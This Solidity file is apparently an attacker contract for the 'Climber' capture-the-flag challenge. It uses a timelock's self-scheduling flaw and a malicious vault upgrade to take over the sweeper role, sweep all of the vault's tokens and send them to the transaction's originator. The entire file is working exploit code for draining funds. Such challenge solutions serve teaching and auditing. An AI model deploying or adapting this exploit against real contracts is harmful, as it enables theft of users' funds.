// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./ClimberTimelock.sol";
import "./MaliciousClimberVault.sol";

/**
 * @title ClimberTimelockScheduler
 * @author MJ
 * @notice Schedules a timelock transaction and sweeps the funds from the vault
 */
contract ClimberTimelockScheduler {
    ClimberTimelock public climberTimelock;
    SchedulePayload public schedulePayload;
    MaliciousClimberVault public maliciousVault;
    IERC20 public token;

    error EmptySchedulePayload();

    struct SchedulePayload {
        address[] targets;
        uint256[] values;
        bytes[] dataElements;
        bytes32 salt;
    }

    constructor(
        ClimberTimelock _climberTimelock,
        MaliciousClimberVault _maliciousVault,
        IERC20 _token
    ) {
        // TODO: add zero address checks
        climberTimelock = _climberTimelock;
        maliciousVault = _maliciousVault;
        token = _token;
    }

    function setSchedulePayload(
        SchedulePayload memory _schedulePayload
    ) external {
        schedulePayload = _schedulePayload;
    }

    /**
     * @notice Schedules a timelock transaction and sweeps the funds from the vault
     * Requires the schedulePayload to be set before executing the function.
     */
    function scheduleTimelock() external {
        if (schedulePayload.targets.length == 0) revert EmptySchedulePayload();
        climberTimelock.schedule(
            schedulePayload.targets,
            schedulePayload.values,
            schedulePayload.dataElements,
            schedulePayload.salt
        );

        if (maliciousVault.getSweeper() != address(this))
            maliciousVault.setSweeper(address(this));

        maliciousVault.sweepFunds(address(token));
        token.transfer(tx.origin, token.balanceOf(address(this)));
    }
}
